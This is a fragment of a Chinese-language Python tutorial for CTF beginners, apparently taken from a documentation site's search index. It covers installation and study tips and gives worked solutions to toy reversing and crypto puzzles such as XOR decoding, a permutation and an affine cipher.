</ul>"},{"location":"python/How%20to%20Learn/#_3","title":"\u5b66\u4e60\u65b9\u6cd5","text":"<p>\u6ce8\u610f</p> <p>\u672c\u6559\u7a0b\u4e3b\u8981\u9762\u5411CTFer\u7684Python\u5b66\u4e60 \u6240\u4ee5\u4e0d\u662f\u5b8c\u5168\u6309\u7167\u6b63\u5e38\u7684Python\u5b66\u4e60\u65b9\u5f0f</p> <p>\u8ba1\u7b97\u673a\u65b9\u9762\u7684\u5b66\u4e60\uff0c\u57fa\u672c\u4e0a\u90fd\u662f\u91cd\u5728\u5b9e\u8df5</p> <p>\u53bb\u4e0a\u624b\u64cd\u4f5c\u624d\u80fd\u771f\u6b63\u7684\u638c\u63e1</p> <p>\u6211\u5e76\u6ca1\u6709\u7cfb\u7edf\u7684\u5b66\u4e60\u8fc7Python\uff0c\u6211\u662f\u4ee5\u4e00\u8fb9\u5199\u4ee3\u7801\u4e00\u8fb9\u5b66\u7684\u65b9\u5f0f\u5b66\u4e60\u7684</p>"},{"location":"python/How%20to%20Learn/#_4","title":"\u5b66\u57fa\u7840","text":"<p>\u4e0d\u8bba\u54ea\u79cd\u8bed\u8a00\u7684\u5b66\u4e60\uff0c\u90fd\u5148\u4ece\u6700\u57fa\u7840\u7684\u8bed\u6cd5\u7ed3\u6784\u5f00\u59cb</p> <ul> <li>\u6570\u636e\u7c7b\u578b</li> <li>\u5faa\u73af</li> <li>if\u8bed\u53e5</li> <li>\u51fd\u6570</li> <li>\u6587\u4ef6\u64cd\u4f5c</li> <li>\u5f02\u5e38\u7684\u5904\u7406</li> <li>\u6a21\u5757\u7684\u5f15\u7528</li> </ul> <p>\u4e00\u4e9b\u5e38\u7528\u7684\u5e93</p> <ul> <li>re</li> <li>os</li> <li>time</li> <li>requests</li> <li>hashlib</li> <li>random</li> <li>\u7b49\u5f85\u8865\u5145</li> </ul>"},{"location":"python/How%20to%20Learn/#_5","title":"\u575a\u6301\u5199\u7a0b\u5e8f","text":"<p>\u4ee3\u7801\u89c4\u8303</p> <p>\u6709\u4e00\u4e2a\u597d\u7684\u4ee3\u7801\u4e66\u5199\u89c4\u8303\uff0c\u771f\u7684\u5f88\u91cd\u8981</p> <p>\uff08\u4e0d\u8981\u5b66\u8c2d\u6d69\u5f3a\u7684a,b,c\u62bd\u8c61\u53d8\u91cf\u547d\u540d\u6cd5\uff0c\u8fd9\u8c01\u770b\u5f97\u61c2\uff09</p> <p>\u5b66\u7f16\u7a0b\u7684\u8fc7\u7a0b\uff0c\u5c31\u50cf\u9ad8\u4e2d\u7684\u5b66\u4e60\u8fc7\u7a0b</p> <p>\u957f\u65f6\u95f4\u4e0d\u53bb\u5199\u5c31\u4f1a\u5fd8\u8bb0\uff0c\u719f\u624d\u80fd\u751f\u5de7</p> <p>\u5237\u9898\u7684\u8bdd\uff0c\u53ef\u4ee5\u8bd5\u4e00\u4e0b\u7f51\u4e0a\u7684   <code>Python\u5165\u95e8\u4e60\u9898100\u9053</code></p> <p>\u6211\u4e5f\u4f1a\u63d0\u4f9b\u4e00\u4e9b\u9762\u5411CTF\u5b66\u4e60\u7684Python\u9898\uff0c\u4f9b\u5927\u5bb6\u7ec3\u4e60</p>"},{"location":"python/How%20to%20Learn/#_6","title":"\u8fdb\u9636","text":"<p>\u89c9\u5f97\u81ea\u5df1\u638c\u63e1\u4e86\u57fa\u7840\u7684\u90e8\u5206\uff0c\u53ef\u4ee5\u5f00\u59cb\u5b66\u4e00\u4e9b\u66f4\u9ad8\u7ea7\u7684\u7528\u6cd5</p> <ul> <li> <p>lambda\u533f\u540d\u51fd\u6570</p> </li> <li> <p>Class\u7c7b</p> </li> <li> <p>\u9ad8\u9636\u51fd\u6570</p> </li> </ul> <p>\u590d\u6742\u4e9b\u7684\u6a21\u5757</p> <p>\u9762\u5411CTFer</p> <ul> <li> <p>pillow \u56fe\u50cf\u5904\u7406</p> </li> <li> <p>numpy \u6570\u636e\u5904\u7406</p> </li> <li> <p>threading \u591a\u7ebf\u7a0b</p> </li> <li> <p>itertools \u8fed\u4ee3</p> </li> </ul>"},{"location":"python/install/","title":"\u5b66\u4e60\u524d\u7684\u51c6\u5907","text":"<p> \u7ea6 313 \u4e2a\u5b57  1 \u5f20\u56fe\u7247  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 1 \u5206\u949f</p>"},{"location":"python/install/#python","title":"Python\u7684\u5b89\u88c5","text":"<p>\u5efa\u8bae\u53bb\u7f51\u4e0a\u627e\u5b89\u88c5\u6559\u7a0b</p>"},{"location":"python/install/#_1","title":"\u5b89\u88c5\u7684\u662f\u4ec0\u4e48","text":"<p>Python\u7684\u89e3\u91ca\u5668\uff0c\u7528\u4ee5\u89e3\u91ca\u4ee3\u7801</p>"},{"location":"python/install/#_2","title":"\u4e0b\u8f7d","text":"<p>\u6781\u4e0d\u63a8\u8350\u901a\u8fc7Microsoft Store\uff08Win10\u81ea\u5e26\u7684\u5fae\u8f6f\u5e94\u7528\u5546\u5e97\uff09\u5b89\u88c5</p>"},{"location":"python/install/#_3","title":"\u5b98\u7f51\u4e0b\u8f7d","text":"<p>https://www.python.org/downloads/</p> <p>\u63a8\u8350\u7684\u662f3.8.9\u7248\u672c \u4e0b\u8f7d\u5730\u5740</p> <p>\u8bb0\u5f97\u5728\u5b89\u88c5\u7684\u65f6\u5019\u52fe\u9009</p>"},{"location":"python/install/#conda","title":"conda","text":"<p>\u4e00\u4e2a\u975e\u5e38\u53d7\u6b22\u8fce\u7684\u5305\u7ba1\u7406\u548c\u73af\u5883\u7ba1\u7406\u5de5\u5177</p> <p>\u7528\u5b83\u5b89\u88c5\uff0c\u53ef\u4ee5\u89e3\u51b3\u5f88\u591a\u73af\u5883\u6df7\u4e71\u4ee5\u53ca\u591a\u7248\u672c\u517c\u5bb9\u7684\u95ee\u9898</p>"},{"location":"python/install/#_4","title":"\u5b89\u88c5","text":""},{"location":"python/install/#_5","title":"\u6ce8\u610f\u4e8b\u9879","text":"<p>\u8bb0\u5f97\u52fe\u9009</p>"},{"location":"python/install/#_6","title":"\u5b66\u4e60\u524d\u7684\u51c6\u5907","text":"<p>\u4e0d\u7528\u518d\u53bb\u914d\u7f6e\u73af\u5883\u53d8\u91cf</p> <p>\u8be6\u7ec6\u7684\u5b89\u88c5\u6b65\u9aa4\u5efa\u8bae\u53bb\u7f51\u4e0a\u641c\u7d22</p>"},{"location":"python/install/#pip","title":"\u5b89\u88c5pip","text":""},{"location":"python/install/#pip_1","title":"\u4ec0\u4e48\u662fpip","text":"<p>pip \u662f\u4e00\u4e2a\u73b0\u4ee3\u7684\uff0c\u901a\u7528\u7684 Python \u5305\u7ba1\u7406\u5de5\u5177\u3002\u63d0\u4f9b\u4e86\u5bf9 Python \u5305\u7684\u67e5\u627e\u3001\u4e0b\u8f7d\u3001\u5b89\u88c5\u3001\u5378\u8f7d\u7684\u529f\u80fd\u3002</p> <p>Python\u5b89\u88c5\u7684\u65f6\u5019\u9009\u62e9Custom install\u53ef\u4ee5\u76f4\u63a5\u5b89\u88c5</p>"},{"location":"python/install/#_7","title":"\u9a8c\u8bc1","text":"<p><code>Win\u952e</code>+<code>R</code> \u6253\u5f00\u8fd0\u884c \u8f93\u5165cmd\u6216powershell</p> <p>\u8f93\u5165<code>python --version</code> \u663e\u793apython\u7248\u672c</p> <p>\u8f93\u5165<code>pip --version</code> \u663e\u793apip\u7248\u672c</p> <p>\u5c31\u5b89\u88c5\u6210\u529f\u4e86</p>"},{"location":"python/install/#_8","title":"\u4ee3\u7801\u7f16\u8f91\u5668","text":"<p>\u6709\u4e00\u4e2a\u8d81\u624b\u7684\u4ee3\u7801\u7f16\u8f91\u5668\u4e5f\u5f88\u91cd\u8981\uff0c\u63d0\u9ad8\u4f60\u7684\u7f16\u7a0b\u4f53\u9a8c</p> <p>\u4f46\u8bb0\u4f4fPython\u662f\u4e00\u95e8\u8de8\u5e73\u53f0\u7684\u89e3\u91ca\u6027\u8bed\u8a00\uff0c\u6240\u4ee5\u4f60\u7528\u8bb0\u4e8b\u672c\u5199\u4e5f\u662f\u53ef\u4ee5\u7684</p>"},{"location":"python/install/#vscode","title":"VScode","text":"<p>https://code.visualstudio.com/</p>"},{"location":"python/install/#pycharm","title":"PyCharm","text":"<p>https://www.jetbrains.com/pycharm/</p>"},{"location":"python/practice/","title":"\u6765\u505a\u70b9\u7ec3\u4e60\u9898\u5427","text":""},{"location":"python/practice/#hello-world","title":"Hello World!","text":"<p>Hello World!</p> <p>\u5728\u5c4f\u5e55\u4e0a\u8f93\u51faHello World!</p> example.py<pre><code>print(\"Hello World!\")\n</code></pre> <p>\u4f60\u5df2\u7ecf\u5b66\u4f1a\u4e86Hello World!    \u6765\u5199\u4e00\u4e2a\u673a\u5668\u5b66\u4e60\u9879\u76ee\u5427</p>"},{"location":"python/practice/#_1","title":"\u4ee3\u7801\u9006\u5411","text":"<p>\u4e00\u822c\u6765\u8bf4\uff0c\u5728crypto\u6216\u8005re\u90e8\u5206</p> <p>\u4f1a\u7ed9\u4f60\u4e00\u6bb5\u4ee3\u7801\u8ba9\u4f60\u7406\u89e3\u4ed6\u7684\u610f\u601d</p> <p>\u7136\u540e\u5199\u51fa\u8fd8\u539fflag\u7684\u4ee3\u7801</p> <p>\u770b\u4e0d\u61c2\u4e5f\u6ca1\u5173\u7cfb\uff0c\u6211\u4f1a\u5199\u51fa\u6c49\u5b57\u7684\u9898\u76ee\u89e3\u91ca</p>"},{"location":"python/practice/#_2","title":"\u5b57\u7b26\u4e32\u9006\u5e8f","text":"Python \u9898\u76ee.py<pre><code>from flag import flag #\u5bfc\u5165flag\uff0c\u8fd9\u91cc\u5c31\u662f\u4f60\u9700\u8981\u6c42\u7684\u90e8\u5206\uff0c\u4e0d\u7528\u5728\u610f\nprint(flag[::-1])\n</code></pre> \u9898\u76ee\u89e3\u91ca\uff08\u5982\u679c\u770b\u4e0d\u61c2\u4ee3\u7801\u6216\u8005\u770b\u5b8c\u4ee3\u7801\u60f3\u8981\u9a8c\u8bc1\u60f3\u6cd5\u518d\u770b\uff09 <p>\u8fd9\u91cc\u6709\u4e00\u6bb5\u5b57\u7b26\u4e32\uff0c<code>}nohtyP_ecitcarp_ot_desu_saw_sihT{UNLQ</code></p> <p>\u5199\u4e00\u6bb5\u4ee3\u7801\u5012\u5e8f\u8f93\u51fa\u7ed3\u679c</p> \u793a\u4f8b\u7b54\u6848\uff08\u70b9\u51fb\u53f3\u4fa7\u53ef\u4ee5\u590d\u5236\uff09 example.py<pre><code>flag = \"}nohtyP_ecitcarp_ot_desu_saw_sihT{UNLQ\"\nprint(flag[::-1])\n</code></pre>"},{"location":"python/practice/#_3","title":"\u5f02\u6216","text":"Python <p>```python title=\"\u9898\u76ee.py\" from flag import flag #\u5bfc\u5165flag\uff0c\u8fd9\u91cc\u5c31\u662f\u4f60\u9700\u8981\u6c42\u7684\u90e8\u5206\uff0c\u4e0d\u7528\u5728\u610f</p> <p>result = [] for i in flag:     result.append(ord(i)^50)</p> <p>print(\"result = \",result)</p> <p> \u7ea6 1199 \u4e2a\u5b57  153 \u884c\u4ee3\u7801  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 6 \u5206\u949f</p> <pre><code>```\n</code></pre> C task.c<pre><code>#include&lt;stdio.h&gt;\nint main(){\n    char compare[] = {99, 126, 124, 103, 73, 102, 90, 91, 65, 109, 69, 83, 65, 109, 71, 65, 87, 86, 109, 70, 93, 109, 66, 64, 83, 81, 70, 91, 81, 87, 109, 98, 75, 70, 90, 93, 92, 79};\n    int i;\n    char flag[38];\n    scanf(\"%s\",&amp;flag);\n    for (i=0;i&lt;38;i++)\n    {\n        flag[i]^=50;\n    }\n    if (strcmp(flag,compare)){\n        printf(\"flag incorrect\"); \n    }else{\n        printf(\"flag correct\"); \n    }\n\n} \n</code></pre> \u9898\u76ee\u89e3\u91ca\uff08\u5982\u679c\u770b\u4e0d\u61c2\u4ee3\u7801\u6216\u8005\u770b\u5b8c\u4ee3\u7801\u60f3\u8981\u9a8c\u8bc1\u60f3\u6cd5\u518d\u770b\uff09 <p>\u6709\u4e00\u4e2a\u6570\u5b57\u7c7b\u578b\u7684\u5217\u8868\uff0c\u88ab\u5f02\u6216\u4e8650</p> <p>\u5199\u4ee3\u7801\u8fd8\u539f\u5e76\u8f93\u51fa\u5b57\u7b26\u4e32</p> \u793a\u4f8b\u7b54\u6848\uff08\u70b9\u51fb\u53f3\u4fa7\u53ef\u4ee5\u590d\u5236\uff09 example.py<pre><code>result =  [99, 126, 124, 103, 73, 102, 90, 91, 65, 109, 69, 83, 65, 109, 71, 65, 87, 86, 109, 70, 93, 109, 66, 64, 83, 81, 70, 91, 81, 87, 109, 98, 75, 70, 90, 93, 92, 79]\nfor i in result:\n    print(chr(i^50),end='')\n</code></pre>"},{"location":"python/practice/#result-99-126-124-103-73-102-90-91-65-109-69-83-65-109-71-65-87-86-109-70-93-109-66-64-83-81-70-91-81-87-109-98-75-70-90-93-92-79","title":"result =  [99, 126, 124, 103, 73, 102, 90, 91, 65, 109, 69, 83, 65, 109, 71, 65, 87, 86, 109, 70, 93, 109, 66, 64, 83, 81, 70, 91, 81, 87, 109, 98, 75, 70, 90, 93, 92, 79]","text":""},{"location":"python/practice/#_4","title":"\u5217\u8868\u76f8\u52a0","text":"Python \u9898\u76ee.py<pre><code>from flag import flag #\u5bfc\u5165flag\uff0c\u8fd9\u91cc\u5c31\u662f\u4f60\u9700\u8981\u6c42\u7684\u90e8\u5206\uff0c\u4e0d\u7528\u5728\u610f\nimport random\narray1 = []\narray2 = []\nfor i in flag:\n    gen = random.randint(1,ord(i))\n    array1.append(ord(i)-gen)\n    array2.append(gen)\n\nprint(\"array1 =\",array1)\nprint(\"array2 =\",array2)\n\n# array1 = [23, 34, 32, 56, 95, 82, 64, 15, 32, 15, 14, 1, 59, 89, 63, 31, 53, 60, 80, 64, 44, 44, 69, 65, 3, 48, 76, 100, 21, 92, 24, 55, 83, 31, 12, 29, 77, 46]\n# array2 = [58, 42, 46, 29, 28, 2, 40, 90, 83, 80, 105, 96, 56, 6, 54, 84, 48, 40, 15, 52, 67, 51, 43, 49, 94, 51, 40, 5, 78, 9, 71, 25, 38, 85, 92, 82, 33, 79]\n</code></pre> \u9898\u76ee\u89e3\u91ca\uff08\u5982\u679c\u770b\u4e0d\u61c2\u4ee3\u7801\u6216\u8005\u770b\u5b8c\u4ee3\u7801\u60f3\u8981\u9a8c\u8bc1\u60f3\u6cd5\u518d\u770b\uff09 <p>\u6709\u4e24\u4e2alist\uff0c\u90fd\u5b58\u50a8\u4e86\u76f8\u540c\u6570\u91cf\u7684\u6570\u5b57</p> <p>\u5c06\u5176\u76f8\u52a0\u8fd8\u539f\u4e3a\u5b57\u7b26\u4e32\u5e76\u8f93\u51fa <pre><code># array1 = [23, 34, 32, 56, 95, 82, 64, 15, 32, 15, 14, 1, 59, 89, 63, 31, 53, 60, 80, 64, 44, 44, 69, 65, 3, 48, 76, 100, 21, 92, 24, 55, 83, 31, 12, 29, 77, 46]\n# array2 = [58, 42, 46, 29, 28, 2, 40, 90, 83, 80, 105, 96, 56, 6, 54, 84, 48, 40, 15, 52, 67, 51, 43, 49, 94, 51, 40, 5, 78, 9, 71, 25, 38, 85, 92, 82, 33, 79]\n</code></pre></p> \u793a\u4f8b\u7b54\u6848\uff08\u70b9\u51fb\u53f3\u4fa7\u53ef\u4ee5\u590d\u5236\uff09 example.py<pre><code>array1 = [23, 34, 32, 56, 95, 82, 64, 15, 32, 15, 14, 1, 59, 89, 63, 31, 53, 60, 80, 64, 44, 44, 69, 65, 3, 48, 76, 100, 21, 92, 24, 55, 83, 31, 12, 29, 77, 46]\narray2 = [58, 42, 46, 29, 28, 2, 40, 90, 83, 80, 105, 96, 56, 6, 54, 84, 48, 40, 15, 52, 67, 51, 43, 49, 94, 51, 40, 5, 78, 9, 71, 25, 38, 85, 92, 82, 33, 79]\n\nfor i in range(len(array1)):\n    print(chr(array1[i]+array2[i]),end='')\n</code></pre>"},{"location":"python/practice/#_5","title":"\u987a\u5e8f\u8fd8\u539f","text":"<p>\u8fd9\u662fNewStarCTF2022\u65b0\u751f\u8d5b\u7684\u4e00\u9053re\u9898\uff0c\u8fd9\u662fexe\u9006\u5411\u5230py\u7684\u7ed3\u679c</p> Python \u9898\u76ee.py<pre><code># uncompyle6 version 3.8.0\n# Python bytecode 3.6 (3379)\n# Decompiled from: Python 3.8.10 (default, Nov 14 2022, 12:59:47) \n# [GCC 9.4.0]\n# Embedded file name: pyre.py\n# Compiled at: 1995-09-28 00:18:56\n# Size of source mod 2**32: 272 bytes\nflag = ''\nencode = 'REla{PSF!!fg}!Y_SN_1_0U'\ntable = [7, 8, 1, 2, 4, 5, 13, 16, 20, 21, 0, 3, 22, 19, 6, 12, 11, 18, 9, 10, 15, 14, 17]\n\ndef enc(input):\n    tmp = ''\n    for i in range(len(input)):\n        tmp += input[table[i]]\n\n    return tmp\n\nfor i in range(len(encode)):\n    print(encode[table.index(i)],end='')\nif __name__ == '__main__':\n    print('Please input your flag:')\n    flag = input()\n    if len(flag) != 23:\n        print('Length Wrong!!')\n    else:\n        final = enc(flag)\n        if final == encode:\n            print('Wow,you get the right flag!!')\n        else:\n            print('Sorry,Your input is Wrong')\n# okay decompiling pyre.pyc\n</code></pre> \u9898\u76ee\u89e3\u91ca\uff08\u5982\u679c\u770b\u4e0d\u61c2\u4ee3\u7801\u6216\u8005\u770b\u5b8c\u4ee3\u7801\u60f3\u8981\u9a8c\u8bc1\u60f3\u6cd5\u518d\u770b\uff09 <p>main\u51fd\u6570\u4e2d\u8981\u6c42\u8f93\u5165flag\uff0c\u6bd4\u8f83\u957f\u5ea6\u4e3a23</p> <p>\u7136\u540e\u4f7f\u7528enc\u51fd\u6570\u628aflag\u52a0\u5bc6\u540e\u548c\u52a0\u5bc6\u7684\u7ed3\u679c\u8fdb\u884c\u6bd4\u8f83</p> <p>\u800cenc\u51fd\u6570\u5b9e\u9645\u662f\u5c06flag\u6309\u7167\u5217\u8868table\u4e2d\u7684\u6570\u5b57\u4f5c\u4e3aindex\u8fdb\u884c\u7f6e\u4e71</p> <p>\u6240\u4ee5\u6211\u4eec\u9700\u8981\u5c06\u52a0\u5bc6\u540e\u7684encode\u6309\u7167\u6253\u4e71\u7684\u8868\u9006\u5e8f\u56de\u53bb</p> \u793a\u4f8b\u7b54\u6848\uff08\u70b9\u51fb\u53f3\u4fa7\u53ef\u4ee5\u590d\u5236\uff09 example.py<pre><code>flag = ''\nencode = 'REla{PSF!!fg}!Y_SN_1_0U'\ntable = [7, 8, 1, 2, 4, 5, 13, 16, 20, 21, 0, 3, 22, 19, 6, 12, 11, 18, 9, 10, 15, 14, 17]\n\nfor i in range(len(encode)):\n    # index(i)\u51fd\u6570\u662f\u4ecelist\u4e2d\u627e\u51fa\u7b2c\u4e00\u4e2a\u503c\u4e3ai\u7684\u5143\u7d20\u5e76\u8fd4\u56de\u4ed6\u7684\u4e0b\u6807(index)\n    # \u8fd9\u91cc\u662f\u4ece0\u5f00\u59cb\uff0c\u5148\u627e\u52300\u5bf9\u5e94\u5728encode\u4e2d\u7684\u4f4d\u7f6e\u7684\u90a3\u4e2a\u6570\uff0c\u4e3af\uff0c\u7136\u540e\u653e\u5165flag\u5b57\u7b26\u4e32\n    flag+=encode[table.index(i)]\nprint(flag)\n\n#flag{PYRE_1S_S0_FUN!!!}\n</code></pre>"},{"location":"python/practice/#_6","title":"\u4eff\u5c04\u5bc6\u7801","text":"<p>\u7ecf\u5178\u7684\u4eff\u5c04\u5bc6\u7801\uff0c\u65f6\u4e0d\u65f6\u4f1a\u89c1\u5230</p> <p>\u4eff\u5c04\u5bc6\u7801\u7684\u5b9a\u4e49</p> <p>\u4eff\u5c04\u5bc6\u7801\uff08Affine Cipher\uff09\u662f\u4e00\u79cd\u7ebf\u6027\u5bc6\u7801\u3002\u5b83\u7684\u52a0\u5bc6\u65b9\u5f0f\u662f\u5c06\u660e\u6587\u7684\u6bcf\u4e2a\u5b57\u6bcd\u66ff\u6362\u6210\u5bc6\u6587\u4e2d\u7684\u5b57\u6bcd\uff0c\u5176\u4e2d\u660e\u6587\u548c\u5bc6\u6587\u4e4b\u95f4\u7684\u5bf9\u5e94\u5173\u7cfb\u53ef\u4ee5\u8868\u793a\u4e3a\uff1a</p> \\[ C = E(x) = (ax + b) mod \\ \\  m \\] <p>\u5176\u4e2d\uff0c\\(x\\)\u662f\u660e\u6587\u4e2d\u5b57\u6bcd\u7684\u4f4d\u7f6e\uff0c\\(C\\)\u662f\u5bc6\u6587\u4e2d\u5b57\u6bcd\u7684\u4f4d\u7f6e\uff0c\\(a\\)\u548c\\(b\\)\u662f\u5bc6\u94a5\uff0c\\(m\\)\u662f\u5b57\u6bcd\u8868\u7684\u5927\u5c0f\u3002\u89e3\u5bc6\u65f6\u4f7f\u7528\u7684\u662f\u6a21\u9006\u5143\u8fdb\u884c\u89e3\u5bc6\uff1a</p> \\[ P = D(y) = a^-1 (y - b) mod \\ \\ m \\] <p>\\(y\\)\u662f\u5bc6\u6587\u4e2d\u5b57\u6bcd\u7684\u4f4d\u7f6e, \\(P\\)\u662f\u660e\u6587\u4e2d\u5b57\u6bcd\u7684\u4f4d\u7f6e\u3002</p> <p>\u539f\u7406\uff1a</p> <p>\u4eff\u5c04\u5bc6\u7801\u7684\u52a0\u5bc6\u548c\u89e3\u5bc6\u90fd\u662f\u901a\u8fc7\u7ebf\u6027\u53d8\u6362\u6765\u5b9e\u73b0\u7684\uff0c\u5373\u5bf9\u660e\u6587\u8fdb\u884c\\(ax+b\\)\u7684\u53d8\u6362,\u53d8\u6362\u540e\u518d\u5bf9\\(m\\)\u53d6\u6a21\u3002</p> <p>\u5176\u4e2d\uff0c\\(a\\)\u548c\\(b\\)\u662f\u5bc6\u94a5\uff0c\u5b83\u4eec\u7528\u6765\u63a7\u5236\u53d8\u6362\u7684\u7ebf\u6027\u53c2\u6570\u3002</p> <p>\\(a\\)\u548c\\(b\\)\u5fc5\u987b\u6ee1\u8db3\\(a\\)\u4e0e\\(m\\)\u4e92\u8d28\uff0c\u624d\u80fd\u4fdd\u8bc1\u53ef\u9006\u6027\u3002</p> <p>\u53d6\u6a21\\(m\\)\u662f\u4e3a\u4e86\u5c06\u5bc6\u6587\u9650\u5236\u5728\u5b57\u6bcd\u8868\u8303\u56f4\u5185\u3002</p> <p>\u89e3\u5bc6\u65f6\u9700\u8981\u4f7f\u7528\\(a\\)\u7684\u9006\u5143\u6765\u8fdb\u884c\u9006\u53d8\u6362, \u9006\u5143\u80fd\u786e\u4fdd\u53ef\u9006\u6027\u3002</p> Python \u9898\u76ee.py<pre><code>from flag import flag\nfrom Crypto.Util.number import *\nfrom random import randint\na = randint(2&lt;&lt;2,2&lt;&lt;5)\nb = randint(0,2&lt;&lt;6)\n\nassert flag[:5]==b'QLNU{' and flag[-1:]==b'}'\n\nassert GCD(a,b)==1\nC = []\n\nfor c in flag:\n    C.append((a*c + b) % 256)\n\nprint(\"C = \",bytes(C))\n\n# C = b'\\x8dz\\xe8i\\x932~\\xb5\\xdb\\x8f\\xb7\\xfd\\xdb\\x8fI\\xdb\\xd9\\xa2\\x8f\\x12\\xff\\x8f6\\xa4\\xfdk\\x12\\xb5k\\xd9\\x8fV%\\x12~\\xff\\xc8\\x01'\n</code></pre> \u9898\u76ee\u89e3\u91ca\uff08\u5982\u679c\u770b\u4e0d\u61c2\u4ee3\u7801\u6216\u8005\u770b\u5b8c\u4ee3\u7801\u60f3\u8981\u9a8c\u8bc1\u60f3\u6cd5\u518d\u770b\uff09 <p>a = randint(2&lt;&lt;2,2&lt;&lt;5)</p> <p>randint\u51fd\u6570\uff0c\u5728\u7ed9\u5b9a\u7684\u4e24\u4e2a\u6570\u8303\u56f4\u4e2d\u53d6\u968f\u673a\u503c\uff0c2&lt;&lt;2\u662f\u57282\u76842\u8fdb\u52360b10\u5411\u5de6\u6269\u5c55\u4e24\u4f4d\u53d8\u62100b1000\u4e5f\u5c31\u662f8,2&lt;&lt;5==64</p> <p>a\u5c31\u662f\u57288\u523064\u4e2d\u53d6\u5e73\u5747\u503c\uff0cb\u540c\u7406</p> <p>assert flag[:5]==b'QLNU{' and flag[-1:]==b'}'</p> <p>assert\u65ad\u8a00\u51fd\u6570\uff0c\u5728\u8868\u8fbe\u5f0f\u4e0d\u6210\u7acb\u7684\u65f6\u5019\u4f1aERROR\u7ed3\u675f\u7a0b\u5e8f\u8fd0\u884c</p> <p>\u8fd9\u91cc\u8868\u793aflag\u7684\u524d\u4e94\u4e2a\u5b57\u7b26\u662f\"QLNU{\"      \u6700\u540e\u4e00\u4e2a\u5b57\u7b26\u662f\"}\"</p> <p>assert GCD(a,b)==1</p> <p>\u8fd9\u91cc\u662f\u4ee3\u8868a,b\u7684\u6700\u5927\u516c\u7ea6\u6570\u662f1\uff0c\u5c31\u662fa b\u4e92\u7d20\uff0c\u4e0d\u8fc7\u7528\u4e0d\u5230\uff0c\u8fd9\u662faffine\u7b97\u6cd5\u7684\u7ea6\u675f\u6761\u4ef6</p> <p>C.append(a*c + b) % 256</p> <p>\u91cd\u70b9\u662f\u8fd9\u91cc,\u8fd9\u662faffine\u7684\u52a0\u5bc6\u8fc7\u7a0b\uff0c\u672c\u9898\u548c\u5e38\u89c1\u4eff\u5c04\u5bc6\u7801\u7684\u533a\u522b\u662f\u6a21\u6570\u7684\u5927\u5c0f</p> <p>\u5e38\u89c1\u7684\u4e3a\u5b57\u6bcd\u8868\u7684\u957f\u5ea626\uff0c\u800c\u8fd9\u91cc\u7528\u7684\u662f\u6574\u4e2achar\u7c7b\u578b\u7684\u8303\u56f4256</p> <p>\u6839\u636e\u4eff\u5c04\u5bc6\u7801\u7684\u6027\u8d28\uff0c\u53ef\u4ee5\u7531C\u53cd\u63a8\u56dec</p> <p>\u89e3\u5bc6\u516c\u5f0f c = ((a\u4e0e256\u7684\u6a21\u9006\u5143)*(C-b)) % 256</p> <p>\u63a5\u4e0b\u6765\u95ee\u9898\u5c31\u662f\u600e\u4e48\u6c42a\u548cb</p> \u793a\u4f8b\u7b54\u6848\uff08\u70b9\u51fb\u53f3\u4fa7\u53ef\u4ee5\u590d\u5236\uff09 example.py<pre><code>C = b'\\x8dz\\xe8i\\x932~\\xb5\\xdb\\x8f\\xb7\\xfd\\xdb\\x8fI\\xdb\\xd9\\xa2\\x8f\\x12\\xff\\x8f6\\xa4\\xfdk\\x12\\xb5k\\xd9\\x8fV%\\x12~\\xff\\xc8\\x01'\nimport libnum\n\n#a\u548cb\u8303\u56f4\u5f88\u5c0f\uff0c\u8003\u8651\u76f4\u63a5\u7206\u7834\nfor a in range(2&lt;&lt;2,2&lt;&lt;5):\n    for b in range(0,2&lt;&lt;6):\n        # \u9a8c\u8bc1\u7528\u539f\u5f0f\u76f8\u540c\u7684\u903b\u8f91\uff0c\u52a0\u5bc6\u6bd4\u8f83\u52a0\u5bc6\u540e\u7684\u7ed3\u679c,\u5df2\u77e5QLNU{\u5f00\u5934\uff0c\n        if (a*ord('Q')+b)%256 == C[0] and (a*ord('L')+b)%256 == C[1] :\n            print(a,b)\n            # \u8fd9\u91cc\u662f\u7528\u4e86\u5d4c\u5957for\u5faa\u73af\uff0c\u53ef\u4ee5\u641c\u7d22python\u4e00\u884cfor\u5faa\u73af\u7684\u683c\u5f0f\u600e\u4e48\u5199\n            # libnum.invmod(x,y)\u662f\u5bf9x\u6c42y\u7684\u6a21\u9006\u5143\n            # \u8fd9\u91cc\u5c31\u662f\u9898\u76ee\u89e3\u91ca\u4e2d\u7684\u89e3\u5bc6\u516c\u5f0f c = ((a\u4e0e256\u7684\u6a21\u9006\u5143)*(C-b)) % 256\n            print(\"\".join([chr((libnum.invmod(a,256)*(i-b))%256)  for i in C]))\n</code></pre>"},{"location":"python/practice/#misc","title":"MISC","text":""},{"location":"python/practice/#01","title":"01\u8f6c\u4e8c\u7ef4\u7801","text":"<p>\u8fd9\u5c5e\u4e8e\u662f\u6700\u7ecf\u5178\u7684\u9898\u578b\u4e86</p> <p>\u7ed9\u4f60\u4e00\u4e320\u548c1\uff0c\u53d1\u73b0\u8fd9\u4e32\u5b57\u7b26\u7684\u957f\u5ea6\u53ef\u4ee5\u5f00\u65b9\uff0c\u6309\u71670\u4e3a\u767d\u8272\uff0c1\u4e3a\u9ed1\u8272\uff0c\u8fb9\u957f\u4e3a \\(\\sqrt[2]{\u5b57\u7b26\u4e32\u957f\u5ea6}\\)</p> <pre><code>1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111110000000000000011001100000011001111001111111100000000000000111100000000000000110011000000110011110011111111000000000000001111001111111111001111001100000000110011111100110011111111110011110011111111110011110011000000001100111111001100111111111100111100110000001100110011111100000011110000111111001100000011001111001100000011001100111111000000111100001111110011000000110011110011000000110011110000000000000011000000001100110000001100111100110000001100111100000000000000110000000011001100000011001111001100000011001111001111111111111100110011110011000000110011110011000000110011110011111111111111001100111100110000001100111100111111111100110000001111110011110011110011001111111111001111001111111111001100000011111100111100111100110011111111110011110000000000000011001100110011001100110011001100000000000000111100000000000000110011001100110011001100110011000000000000001111111111111111111111000000111100111111110000111111111111111111111111111111111111110000001111001111111100001111111111111111111100110011111100001100111111000011001111110011110011110011001111001100111111000011001111110000110011111100111100111100110011111100001100001111110000001100110000111100000000001100110011111111000011000011111100000011001100001111000000000011001100111111111100000011000011001100001111000000000000000011001100110011111111000000110000110011000011110000000000000000110011001100111111001100000011001111000011001111001100110000001111001111001111110011000000110011110000110011110011001100000011110011110011111100000011110000110011111100110011111100111100001111111111111111000000111100001100111111001100111111001111000011111111111111001111000000110011000000111111000011110000001100111